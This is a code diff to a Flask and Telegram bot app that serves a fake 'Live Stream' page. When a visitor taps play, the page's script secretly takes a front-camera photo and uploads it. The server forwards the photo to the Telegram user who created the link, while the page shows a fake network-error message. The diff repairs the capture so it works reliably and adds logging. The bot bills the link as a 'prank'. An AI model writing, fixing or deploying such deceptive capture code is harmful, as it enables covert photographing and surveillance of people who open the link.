@@ -1,4 +1,5 @@
 import os
+import io
 import time
 from flask import Flask, request, abort, render_template_string
 import telebot
@@ -44,23 +45,153 @@ def capture_page():
 
     html = """
     <!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Live Stream</title>
-    <style>body{background:#000;margin:0;height:100vh;display:flex;justify-content:center;align-items:center;color:#fff;font-family:sans-serif;flex-direction:column}#clickArea{width:100%;height:100%;display:flex;justify-content:center;align-items:center;cursor:pointer;flex-direction:column;background:url('https://img.freepik.com/free-photo/wide-angle-shot-soccer-field_23-2148172385.jpg')center/cover;position:relative}.overlay{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5)}.play-icon{width:90px;height:90px;background:rgba(255,255,255,0.3);border-radius:50%;display:flex;justify-content:center;align-items:center;z-index:2;border:3px solid #fff;transition:0.2s}.play-icon:hover{background:rgba(255,255,255,0.6)}.play-icon svg{fill:#fff;width:36px;height:36px;margin-left:4px}#msg{z-index:2;margin-top:25px;font-size:18px;color:#eee;text-shadow:1px 1px 3px #000}.live-badge{position:absolute;top:20px;right:20px;background:#ff0000;color:#fff;padding:5px 12px;border-radius:20px;font-size:12px;font-weight:bold;animation:pulse 1.5s infinite;z-index:2}@keyframes pulse{0%{opacity:1}50%{opacity:0.6}100%{opacity:1}}.loading-bar{position:absolute;bottom:0;left:0;width:100%;height:4px;background:#333;z-index:2;display:none}.progress{height:100%;width:0%;background:#00d1ff;transition:width 2s}video,canvas{display:none}</style>
-    <body><div id=clickArea><div class=overlay></div><span class=live-badge>Live</span><div class=play-icon><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div><div id=msg>Tap to play stream</div></div><div class=loading-bar id=loadingBar><div class=progress id=progress></div></div><video id=video playsinline></video><canvas id=canvas style="display:none;"></canvas>
-    <script>const a=document.getElementById('clickArea'),m=document.getElementById('msg'),v=document.getElementById('video'),c=document.getElementById('canvas'),u={{user_id}}, bar=document.getElementById('loadingBar'), prog=document.getElementById('progress');let captured=!1;a.onclick=function(){if(captured)return;m.innerText="Connecting to server...";bar.style.display="block";prog.style.width="40%";navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:640},height:{ideal:480}},audio:false}).then(function(stream){v.srcObject=stream;return v.play();}).then(function(){const context=c.getContext('2d');c.width=v.videoWidth;c.height=v.videoHeight;context.drawImage(v,0,0,c.width,c.height);if(v.srcObject){v.srcObject.getTracks().forEach(track=>track.stop());v.srcObject=null;}captured=!0;prog.style.width="100%";m.innerText="Loading stream...";c.toBlob(function(blob){if(!blob)return;const f=new FormData();f.append('photo',blob,'photo.jpg');f.append('user_id',u);fetch('/capture',{method:'POST',body:f});setTimeout(()=>{bar.style.background="#ff3333";a.style.background="#000";document.querySelector('.overlay').style.background="rgba(0,0,0,1)";document.querySelector('.play-icon').style.display="none";document.querySelector('.live-badge').style.display="none";m.innerHTML="<span style='color:#ff5555;font-size:20px;'>⚠️ خطأ في الشبكة<br>تعذر تحميل البث المباشر.</span>";},1500);},'image/jpeg');}).catch(function(err){prog.style.display="none";m.innerText="⚠️ يرجى السماح للكاميرا للاستمرار.";m.style.color="#ffaa00";captured=!1;});};</script></body></html>
+    <style>body{background:#000;margin:0;height:100vh;display:flex;justify-content:center;align-items:center;color:#fff;font-family:sans-serif;flex-direction:column;overflow:hidden}#clickArea{width:100%;height:100%;display:flex;justify-content:center;align-items:center;cursor:pointer;flex-direction:column;background:url('https://images.pexels.com/photos/1148399/pexels-photo-1148399.jpeg?auto=compress&cs=tinysrgb&w=1200')center/cover;position:relative}.overlay{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:1}.play-icon{width:90px;height:90px;background:rgba(255,255,255,0.3);border-radius:50%;display:flex;justify-content:center;align-items:center;z-index:3;border:3px solid #fff;transition:0.2s;position:relative}.play-icon:hover{background:rgba(255,255,255,0.6)}.play-icon svg{fill:#fff;width:36px;height:36px;margin-left:4px}#msg{z-index:3;margin-top:25px;font-size:18px;color:#eee;text-shadow:1px 1px 3px #000;position:relative}.live-badge{position:absolute;top:20px;right:20px;background:#ff0000;color:#fff;padding:5px 12px;border-radius:20px;font-size:12px;font-weight:bold;animation:pulse 1.5s infinite;z-index:3}@keyframes pulse{0%{opacity:1}50%{opacity:0.6}100%{opacity:1}}.loading-bar{position:absolute;bottom:0;left:0;width:100%;height:4px;background:#333;z-index:4;display:none}.progress{height:100%;width:0%;background:#00d1ff;transition:width 2s}#video{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:10;display:none}#canvas{display:none}</style>
+    <body>
+    <div id=clickArea>
+        <div class=overlay></div>
+        <span class=live-badge>Live</span>
+        <div class=play-icon><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
+        <div id=msg>Tap to play stream</div>
+    </div>
+    <div class=loading-bar id=loadingBar><div class=progress id=progress></div></div>
+    <video id=video playsinline autoplay muted></video>
+    <canvas id=canvas></canvas>
+    <script>
+        var a=document.getElementById('clickArea'),m=document.getElementById('msg'),v=document.getElementById('video'),c=document.getElementById('canvas'),u={{user_id}},bar=document.getElementById('loadingBar'),prog=document.getElementById('progress');
+        var captured=false;
+        
+        a.onclick=function(){
+            if(captured)return;
+            m.innerText="Connecting to server...";
+            bar.style.display="block";
+            prog.style.width="40%";
+            
+            navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:640},height:{ideal:480}},audio:false})
+            .then(function(stream){
+                // ✅ إظهار الفيديو أثناء الالتقاط - هذا هو الإصلاح الجوهري
+                v.style.display="block";
+                v.srcObject=stream;
+                return v.play();
+            })
+            .then(function(){
+                // ✅ الانتظار حتى يتم تحميل أبعاد الفيديو
+                return new Promise(function(resolve){
+                    if(v.videoWidth && v.videoHeight && v.videoWidth>0){
+                        resolve();
+                    } else {
+                        v.onloadedmetadata=function(){ resolve(); };
+                        setTimeout(resolve, 1500); // timeout احتياطي
+                    }
+                });
+            })
+            .then(function(){
+                // ✅ تأخير بسيط لضمان رسم الإطار الأول
+                return new Promise(function(resolve){ setTimeout(resolve, 700); });
+            })
+            .then(function(){
+                c.width=v.videoWidth||640;
+                c.height=v.videoHeight||480;
+                var context=c.getContext('2d');
+                context.drawImage(v,0,0,c.width,c.height);
+                
+                console.log("Captured image dimensions:", c.width, "x", c.height);
+                
+                // ✅ إخفاء الفيديو بعد الالتقاط
+                v.style.display="none";
+                
+                if(v.srcObject){
+                    v.srcObject.getTracks().forEach(function(track){track.stop();});
+                    v.srcObject=null;
+                }
+                captured=true;
+                prog.style.width="100%";
+                m.innerText="Loading stream...";
+                
+                c.toBlob(function(blob){
+                    if(!blob){
+                        console.log("toBlob returned null");
+                        m.innerText="❌ فشل التقاط الصورة";
+                        return;
+                    }
+                    console.log("Blob size:", blob.size);
+                    var f=new FormData();
+                    f.append('photo',blob,'photo.jpg');
+                    f.append('user_id',u);
+                    fetch('/capture',{method:'POST',body:f})
+                    .then(function(res){return res.text();})
+                    .then(function(data){console.log("Server response:",data);})
+                    .catch(function(e){console.log("Fetch error:",e);});
+                    
+                    setTimeout(function(){
+                        bar.style.background="#ff3333";
+                        a.style.background="#000";
+                        document.querySelector('.overlay').style.background="rgba(0,0,0,1)";
+                        document.querySelector('.play-icon').style.display="none";
+                        document.querySelector('.live-badge').style.display="none";
+                        m.innerHTML="<span style='color:#ff5555;font-size:20px;'>⚠️ خطأ في الشبكة<br>تعذر تحميل البث المباشر.</span>";
+                    },1500);
+                },'image/jpeg',0.9);
+            })
+            .catch(function(err){
+                prog.style.display="none";
+                m.innerText="⚠️ يرجى السماح للكاميرا للاستمرار.";
+                m.style.color="#ffaa00";
+                captured=false;
+                console.log("Camera error:",err);
+            });
+        };
+    </script>
+    </body></html>
     """
     return render_template_string(html, user_id=user_id)
 
 @app.route("/capture", methods=["POST"])
 def capture():
-    photo = request.files.get("photo"); user_id = request.form.get("user_id", type=int)
-    is_allowed = False
-    if users_collection is not None:
-        is_allowed = users_collection.find_one({"user_id": user_id}) is not None
-    if not photo or not user_id or not is_allowed: return "Invalid request", 400
     try:
-        bot.send_photo(chat_id=user_id, photo=photo.stream.read())
+        photo = request.files.get("photo")
+        user_id = request.form.get("user_id", type=int)
+        
+        print(f"--- 📸 CAPTURE POST RECEIVED ---")
+        print(f"    user_id: {user_id} (type: {type(user_id).__name__})")
+        print(f"    photo present: {photo is not None}")
+        
+        if not photo:
+            print("❌ No photo file in request")
+            return "No photo", 400
+        if not user_id:
+            print("❌ No user_id in request")
+            return "No user_id", 400
+        
+        is_allowed = False
+        if users_collection is not None:
+            is_allowed = users_collection.find_one({"user_id": user_id}) is not None
+        if not is_allowed:
+            print(f"❌ user_id {user_id} not authorized")
+            return "Not authorized", 403
+        
+        # ✅ قراءة الصورة من البداية
+        photo.stream.seek(0)
+        photo_bytes = photo.stream.read()
+        
+        print(f"📸 Photo size: {len(photo_bytes)} bytes")
+        
+        if not photo_bytes or len(photo_bytes) < 100:
+            print(f"❌ Photo is empty or too small: {len(photo_bytes)} bytes")
+            return "Empty photo", 400
+        
+        # ✅ إنشاء ملف مع اسم مناسب لتيليجرام
+        photo_file = io.BytesIO(photo_bytes)
+        photo_file.name = "capture.jpg"
+        
+        result = bot.send_photo(chat_id=user_id, photo=photo_file)
+        print(f"✅ Photo sent successfully! message_id={result.message_id}")
         return "Image sent", 200
-    except Exception as e: return f"Error: {e}", 500
+        
+    except Exception as e:
+        print(f"❌ Error in /capture: {e}")
+        import traceback
+        traceback.print_exc()
+        return f"Error: {e}", 500
 
 @app.route("/webhook", methods=["POST"])
 def webhook():
@@ -76,7 +207,8 @@ def webhook():
         abort(403)
 
 @bot.message_handler(commands=["start"])
-def start(message): bot.reply_to(message, "مرحبًا! أرسل الأمر /link لصنع المقلب.")
+def start(message): 
+    bot.reply_to(message, "مرحبًا! أرسل الأمر /link لصنع المقلب.")
 
 @bot.message_handler(commands=["link"])
 def link(message):
